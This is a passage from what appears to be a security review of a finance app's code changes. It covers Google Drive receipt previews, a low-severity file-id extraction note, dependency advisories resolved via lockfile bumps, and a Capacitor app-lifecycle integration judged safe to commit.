  `www.googleapis.com/drive/v3/files/<id>?alt=media` endpoint (`googleDrive.ts:203-209`). No
  cookie auth, no reliance on a public link — works for owner-private files. PDF vs image is
  branched on `blob.type === 'application/pdf'` (`ExpensesView.tsx:118`): PDF -> same-origin
  `<iframe src={objectUrl}>`, image -> `<img src={objectUrl}>`.
- **Object-URL lifecycle:** the effect creates the object URL and its cleanup runs
  `URL.revokeObjectURL(objectUrl)` on dependency change/unmount, guarded by a `cancelled`
  flag so an in-flight fetch that resolves after close doesn't leak a URL
  (`ExpensesView.tsx:121-134`). The download button now points at the in-memory
  `receiptPreview.url` (the object URL), not the public Drive link, and is only rendered when
  `receiptPreview` exists. On `fileId === null` or fetch failure it shows the error state and
  sets no preview. No blob-URL leak path found.
- **SSRF / wrong-file probe (new-issue check):** `receiptUrl` is attacker-influencable (it
  comes from `app_data.json`, only `toOptionalStr`-typed, `appStateSchema.ts:158`). The host
  is hardcoded, so no arbitrary-host SSRF is possible — `fileId` is only a path segment.
  Residual nuance: `extractDriveFileId`'s `([^/]+)` capture permits `?`/`#`/`..`, so a
  tampered `receiptUrl` could in principle append query params or a path segment to the Drive
  call. Impact is bounded to the FinFlow user's **own** `drive.file`-scoped files (the
  attacker can at most make the user fetch a different app-created file of their own, or a
  malformed request that 404s) — no cross-account read, no external host, no token leak. This
  is a **Low** hardening note, not an exploitable finding: prefer encoding the id
  (`encodeURIComponent`) and/or constraining the capture to Drive's id charset
  (`[A-Za-z0-9_-]+`). Same applies to the legacy `deleteExpense` extraction
  (`FinanceContext.tsx:514`). **Closed; one Low hardening note for `alex`.**

### New-issue sweep — none material
- **`defaults.ts` (new shared module):** `DEFAULT_BUSINESS_SETTINGS` / `DEFAULT_CATEGORIES`
  are byte-identical to the three former inline copies (FinanceContext, googleDrive
  `DEFAULT_STATE`, appStateSchema). Consumers spread/copy them (`[...DEFAULT_CATEGORIES]`,
  `{ ...DEFAULT_BUSINESS_SETTINGS }`) at each use, so the shared mutable arrays/objects are
  not aliased into live state — no shared-reference mutation hazard. `type: 'EsekPatur'`,
  `vatCashBasis: false`, `isDetailedFiler: false` defaults are unchanged. **No
  security-relevant default changed.** Pure de-duplication; reduces drift risk (a security
  positive for the F-7 normalizer).
- **`preparePdf` refactor (`SendInvoiceModal.tsx`):** renamed from `getPDFAndDriveUrl`; now
  returns only the blob and no longer surfaces a `driveUrl` to either sender. The
  archive-upload (`uploadInvoicePDF`) still runs for the `pdfUrl` "already-issued" signal, but
  the upload no longer sets public-read (F-1) and the URL is no longer placed in the
  email/WhatsApp message — consistent with F-1 CLOSED. `driveUrl` removed from
  `ShareInvoiceParams` (`share.ts`) and from the modal's `shareInvoice` call. No regression;
  removes a residual exposure path rather than adding one.
- **Token handling in the new preview path:** uses `authService.getValidAccessToken()`
  (silent-refresh path) per open; token is only sent as a Bearer header to the hardcoded
  Google host, never logged, never placed in the object URL or DOM. No new token exposure.

### Dependency re-confirmation (2026-06-17, live)
- **`npm audit` now reports `found 0 vulnerabilities`** (was 1 High + 2 Moderate). Confirmed
  the working tree resolves all three prior advisories via transitive lockfile bumps —
  `package.json` is **unchanged** (no new direct deps were added by this fix):
  - `vite@8.0.16` (was in the vulnerable `8.0.0–8.0.15` range) — GHSA-fx2h-pf6j-xcff /
    GHSA-v6wh-96g9-6wx3 fixed.
  - `dompurify@3.4.10` (>3.4.8, transitive via `jspdf`) — GHSA-x4vx-rjvf-j5p4 fixed. (App
    still uses its own `escapeHtml`, not DOMPurify, so this was never in the runtime path.)
  - `tar@7.5.16` (>7.5.15, transitive via `@capacitor/cli`) — GHSA-vmf3-w455-68vh fixed.
- **Spot-check of bumped/co-bumped packages:** the lock also moved Vite's rolldown/oxc and
  emnapi build-time binaries by patch/minor (e.g. `@rolldown/binding-*` 1.0.2->1.0.3,
  `@oxc-project/types` 0.132->0.133). These are dev/build-only native binaries pulled by the
  Vite 8.0.16 toolchain; none are app-runtime deps and none carry advisories. Nothing risky
  was introduced.
- **Capacitor share/filesystem (added in the earlier commit) re-confirmed present and clean:**
  `@capacitor/share@8.0.1`, `@capacitor/filesystem@8.1.2` — no advisories.

### Residual verdict
- **R1, R2, R3: CLOSED.** All three follow-up gaps are remediated with verified code, at both
  source and sink where applicable.
- **New findings:** one **Low** hardening note only — the Drive `fileId` extraction
  (`extractDriveFileId`, `FinanceContext.tsx:514`) accepts `?`/`#`/`..` in the captured id;
  encode the id and/or constrain the capture to `[A-Za-z0-9_-]+`. Bounded by `drive.file`
  scope; not exploitable for SSRF or cross-account access. Hand to `alex` as a tidy-up.
- **No regressions** introduced by the fix; `defaults.ts` changes no security-relevant
  default; the account-switch guard does not over-purge legitimate same-account sessions.

**Overall residual risk: Low–Medium** (improved from Medium). No High/Critical remains; the
exploitable PII/exfiltration and the three follow-up gaps are closed and dependencies are at
`0 vulnerabilities`. Residual risk is now dominated by the unchanged, architectural items —
F-5 (access token in `localStorage`, no-backend constraint) and the F-9/F-10 hardening
backlog — plus the single Low Drive-id-encoding nit above.

---

## @capacitor/app Integration Review (2026-06-17)

Reviewed Alex's **uncommitted** working-tree change against baseline `30cce80`
(`git diff 30cce80 -- src/`). Scope: the `@capacitor/app` integration and the auth code it
touches — `AuthContext.tsx`, `services/auth.ts`, `FinanceContext.tsx`, `AppLayout.tsx`,
`utils/financeCache.ts`, `i18n/locales/{en,he}.json`. **Verdict: safe to commit. No new
HIGH/CRITICAL.** One pre-existing Low note (F-5) is unchanged.

**What the change actually is:** a session-resilience / offline-first refactor. The *only*
`@capacitor/app` API used is `App.addListener('appStateChange', …)` to refresh the token when
the app returns to foreground (`AuthContext.tsx:114-117`). `@capacitor/app@8.1.0` was already a
dependency at baseline (present in `package.json:14` and the lockfile pre-change) — this commit
adds **no new dependency**. `npm audit` = 0 vulnerabilities; GitHub Advisory DB returns none for
`@capacitor/app`.

### 1. Deeplink / appUrlOpen handling — SAFE (not present)
No `appUrlOpen`, `getLaunchUrl`, `backButton`, or any URL-bearing listener was added
(`grep` across `src/` finds only the single `appStateChange` listener at
`AuthContext.tsx:115`). The `appStateChange` event payload is `{ isActive: boolean }` only — it
carries no URL, code, or token, so there is **no** incoming-URL parse, no open-redirect, no
OAuth-code/token interception sink, and no injection surface from a crafted deeplink. The entire
deeplink threat class does not apply to this change. (OAuth redirect handling remains inside the
`@capgo/capacitor-social-login` plugin, untouched here.)

### 2. App.openUrl / external URL opening — SAFE (not present)
No `App.openUrl` or other external-URL-open call was introduced. N/A.

### 3. Auth regressions — SAFE (prior hardening preserved, and strengthened)
- **F-3 finance_* purge on logout:** intact. `logout()` clears `auth_*` then calls
  `clearFinanceCache()` (`AuthContext.tsx:238-247`); FinanceContext still runs its
  flush-then-wipe on the auth `true->false` transition and now *also* clears the new
  `finance_pending_save` key (`FinanceContext.tsx:627-633`; key added to `FINANCE_CACHE_KEYS`,
  `financeCache.ts`). `setSessionExpired(false)` was added to logout (`AuthContext.tsx:236`) — no
  leak.
- **F-3 account-switch purge with fail-safe:** intact and unchanged in logic — keep-on-confirmed-
  same-account guard (`AuthContext.tsx:153-158`), with the `catch` fail-safe `clearFinanceCache()`
  on any failure to determine the prior account (`:159-163`). A silent re-auth returning no
  `profile.email` still triggers the purge (`!!newEmail` false). Fires fail-safe on missing email:
  confirmed.
- **Token storage / refresh:** storage location unchanged (`localStorage`, F-5 — still OPEN,
  architectural, not regressed). Refresh logic is *hardened*: `getValidAccessToken()` no longer
  returns a stale/dead cached token after a failed refresh — it throws `AuthExpiredError`
  (`auth.ts:191-228`), which callers map to the reconnect state. This removes the prior
  dead-token-masquerading-as-live behaviour. Net security posture improves.
- **No token in logs / app-state / URL events:** confirmed. The `appStateChange` callback logs
  nothing and receives no token. `getValidAccessToken` logs only the *error* object on refresh
  failure (`auth.ts:222`), never the token. The new `console.error` in `flushToDrive`
  (`FinanceContext.tsx:427`) logs the error/reason string, not the token or token-bearing state.
  No token is placed into any event payload, URL, or DOM by this change.

### 4. Foreground/resume data refresh — SAFE (per-workspace gate + concurrency guard preserved)
Critical distinction: the resume listener refreshes the **token only** — it does not re-fetch
Drive data. `refreshOnForeground()` calls `getValidAccessToken()` and updates `accessToken` /
`sessionExpired` (`AuthContext.tsx:100-112`). Data re-fetch (`syncFromDrive`) is still driven by
the existing `[activeBusiness, isAuthenticated, accessToken]` effect, which retains:
- the **per-workspace gate** — local cache is only treated as authoritative when
  `loadedBusinessId.current === activeBusiness.id` (`FinanceContext.tsx:466-468`); a workspace
  switch ignores the prior workspace's in-memory state, so no cross-workspace leak; and the
  persistence effect still bails when `loadedBusinessId.current !== activeBusiness.id`
  (`:552`).
- the **optimistic-concurrency guard** — saves still go through `saveAppStateGuarded` with
  `driveVersion.current` (`FinanceContext.tsx:405-411`) and adopt the merged result on a detected
  concurrent write (`:415-421`). The new load-time `mergeAppState(localSnapshot, driveData)`
  (`:485-487`) is union-by-id local-wins and only engages for the *same* workspace's cache, so it
  reconciles rather than clobbers — it does not weaken the version guard. No cross-workspace leak
  and no concurrency-guard regression found.

### 5. New PII exposure via lifecycle events / platform-gating — SAFE
The `appStateChange` event exposes no PII (boolean only). Native-only code is correctly
platform-gated: `Capacitor.isNativePlatform()` selects the native `App.addListener` path and the
web build falls back to `document.visibilitychange` (`AuthContext.tsx:114-131`), with both
listeners properly removed on cleanup (`h.remove()` / `removeEventListener`) and an `active`
guard to drop late async results. No `@capacitor/app` native API runs on web. The new i18n
strings are static UI labels (no PII).

### Verdict
Safe to commit. The change introduces no new attack surface from `@capacitor/app` (no
deeplink/openUrl), preserves the F-3 logout and account-switch purges (with the missing-email
fail-safe), preserves the per-workspace isolation gate and the optimistic-concurrency guard, and
actually strengthens token handling (no dead-token fallback). No token is logged or exposed via
lifecycle events. Residual risk unchanged: F-5 (token in `localStorage`, architectural) and the
F-9/F-10 hardening backlog. Overall residual risk remains **Low–Medium**.
